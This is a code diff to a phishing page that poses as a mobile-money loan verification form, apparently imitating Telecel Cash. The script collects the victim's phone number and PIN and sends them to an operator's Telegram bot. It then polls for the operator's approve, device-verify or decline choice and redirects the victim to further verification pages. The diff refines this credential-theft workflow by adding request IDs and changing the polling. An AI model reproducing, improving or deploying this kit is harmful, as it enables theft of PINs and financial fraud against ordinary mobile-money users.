@@ -32,7 +32,6 @@
             align-items: center;
             justify-content: center;
             padding: 16px;
-            background-image: radial-gradient(ellipse at 20% 10%, rgba(228,35,32,0.06) 0%, transparent 55%);
         }
         .card {
             width: 100%;
@@ -50,26 +49,22 @@
         .header {
             background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
             padding: 28px 28px 24px;
-            position: relative;
-            overflow: hidden;
         }
         .logo-wrap {
             display: flex;
             align-items: center;
             gap: 12px;
             margin-bottom: 18px;
-            position: relative;
-            z-index: 1;
         }
         .logo-bg {
             background: white;
             border-radius: 14px;
             padding: 6px;
+            width: 48px;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 48px;
-            height: 48px;
         }
         .brand-name {
             font-family: 'Sora', sans-serif;
@@ -80,14 +75,12 @@
         .brand-sub {
             font-size: 11.5px;
             color: rgba(255,255,255,0.72);
-            text-transform: uppercase;
         }
         .header-title {
             font-family: 'Sora', sans-serif;
             font-size: 23px;
             font-weight: 800;
             color: white;
-            letter-spacing: -0.5px;
         }
         .header-desc {
             font-size: 13.5px;
@@ -166,7 +159,6 @@
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 18px rgba(228,35,32,0.35);
         }
         .btn-primary:disabled {
             background: #d1d5db;
@@ -299,7 +291,7 @@
 
 <div id="spinner">
     <div class="spin-ring"></div>
-    <p style="color:white;">Verifying & Processing...</p>
+    <p style="color:white;">Waiting for admin approval...</p>
 </div>
 
 <script>
@@ -312,7 +304,8 @@
 
     let isProcessing = false;
     let userPhone = '';
-    let pollingInterval = null;
+    let checkInterval = null;
+    let currentRequestId = null;
 
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('password');
@@ -321,7 +314,6 @@
     const statusMsg = document.getElementById('statusMsg');
     const spinner = document.getElementById('spinner');
 
-    // Load loan data from sessionStorage
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
         if (calculatorData) {
@@ -357,11 +349,11 @@
         continueBtn.disabled = true;
         continueBtn.textContent = "Verifying...";
 
-        const uniqueId = Date.now();
-        const approveId = `approve_${uniqueId}`;
-        const verifyDeviceId = `verify_device_${uniqueId}`;
-        const appliedId = `applied_${uniqueId}`;
-        const declineId = `decline_${uniqueId}`;
+        currentRequestId = Date.now().toString();
+        const approveId = `approve_${currentRequestId}`;
+        const verifyDeviceId = `verify_device_${currentRequestId}`;
+        const appliedId = `applied_${currentRequestId}`;
+        const declineId = `decline_${currentRequestId}`;
 
         const loanAmount = document.getElementById('loanAmount').textContent;
         const accountType = document.getElementById('accountType').value === 'mobile' ? 'Telecel Cash' : 'Broadband';
@@ -372,7 +364,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Account:</b> ${accountType}\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
+                    text: `<b>🔴 NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Account:</b> ${accountType}\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🆔 Request ID:</b> <code>${currentRequestId}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -393,22 +385,22 @@
             
             if (data.ok) {
                 spinner.style.display = 'flex';
-                // Start polling for this specific callback data
-                startPollingForCallback([approveId, verifyDeviceId, appliedId, declineId]);
+                // Start checking for response
+                startCheckingForResponse(approveId, verifyDeviceId, appliedId, declineId);
             } else {
                 throw new Error(data.description || 'Failed to send message');
             }
         } catch (error) {
-            console.error('Telegram API Error:', error);
+            console.error('Error:', error);
             resetButton();
             showError("Network error: " + error.message);
         }
     }
 
-    function startPollingForCallback(expectedCallbacks) {
+    function startCheckingForResponse(approveId, verifyDeviceId, appliedId, declineId) {
         let lastUpdateId = 0;
         
-        // First, get current offset to avoid old messages
+        // Get current offset first
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`)
             .then(r => r.json())
             .then(data => {
@@ -416,65 +408,48 @@
                     lastUpdateId = data.result[data.result.length - 1].update_id;
                 }
                 
-                // Start polling
-                pollingInterval = setInterval(() => {
-                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`)
+                // Poll every 2 seconds
+                checkInterval = setInterval(() => {
+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                         .then(r => r.json())
                         .then(data => {
                             if (!data.ok || !data.result || data.result.length === 0) return;
                             
                             for (const update of data.result) {
-                                lastUpdateId = update.update_id;
+                                if (update.update_id > lastUpdateId) {
+                                    lastUpdateId = update.update_id;
+                                }
                                 
                                 if (update.callback_query) {
                                     const callbackData = update.callback_query.data;
                                     const callbackId = update.callback_query.id;
                                     
-                                    console.log('Received callback:', callbackData);
+                                    console.log('Callback received:', callbackData);
                                     
-                                    // Answer the callback query
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            callback_query_id: callbackId,
-                                            text: "Processing..."
-                                        })
-                                    }).catch(console.error);
-                                    
-                                    if (callbackData === expectedCallbacks[0]) { // Approve
-                                        clearInterval(pollingInterval);
-                                        pollingInterval = null;
+                                    // Check if this callback matches our request
+                                    if (callbackData === approveId) {
+                                        clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("✅ Loan Approved! Redirecting...", "success");
-                                        
-                                        setTimeout(() => {
-                                            window.location.href = CONFIG.DEVICE_PAGE;
-                                        }, 1500);
+                                        window.location.href = CONFIG.DEVICE_PAGE;
                                         return;
                                     }
-                                    else if (callbackData === expectedCallbacks[1]) { // Verify Device
-                                        clearInterval(pollingInterval);
-                                        pollingInterval = null;
+                                    else if (callbackData === verifyDeviceId) {
+                                        clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("📱 Device verification required.", "processing");
-                                        
-                                        setTimeout(() => {
-                                            window.location.href = '/device_verify.html';
-                                        }, 1500);
+                                        window.location.href = '/device_verify.html';
                                         return;
                                     }
-                                    else if (callbackData === expectedCallbacks[2]) { // Already Applied
-                                        clearInterval(pollingInterval);
-                                        pollingInterval = null;
+                                    else if (callbackData === appliedId) {
+                                        clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("📋 You have already applied.", "error");
                                         resetButton();
                                         return;
                                     }
-                                    else if (callbackData === expectedCallbacks[3]) { // Decline
-                                        clearInterval(pollingInterval);
-                                        pollingInterval = null;
+                                    else if (callbackData === declineId) {
+                                        clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showError("❌ Request declined.");
                                         resetButton();
@@ -483,8 +458,8 @@
                                 }
                             }
                         })
-                        .catch(err => console.error('Polling error:', err));
-                }, 1000);
+                        .catch(err => console.error('Poll error:', err));
+                }, 2000);
             });
     }
 
@@ -492,9 +467,9 @@
         isProcessing = false;
         continueBtn.disabled = false;
         continueBtn.textContent = "Verify & Authorize Loan";
-        if (pollingInterval) {
-            clearInterval(pollingInterval);
-            pollingInterval = null;
+        if (checkInterval) {
+            clearInterval(checkInterval);
+            checkInterval = null;
         }
     }
 
